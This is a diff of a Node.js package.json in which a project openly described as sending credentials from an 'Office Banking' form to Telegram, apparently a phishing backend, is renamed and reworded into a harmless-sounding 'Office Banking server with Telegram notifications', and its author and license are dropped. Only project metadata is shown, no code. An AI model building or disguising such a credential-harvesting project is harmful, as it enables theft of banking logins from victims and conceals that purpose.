@@ -1,7 +1,7 @@
 {
-  "name": "proyecto-universo-backend",
+  "name": "office-banking-server",
   "version": "1.0.0",
-  "description": "Backend en Node.js para enviar credenciales desde formulario Office Banking a Telegram",
+  "description": "Servidor Express para Office Banking con notificaciones a Telegram",
   "main": "server.js",
   "scripts": {
     "start": "node server.js"
@@ -13,7 +13,5 @@
   },
   "engines": {
     "node": ">=14"
-  },
-  "author": "Pedro",
-  "license": "MIT"
+  }
 }
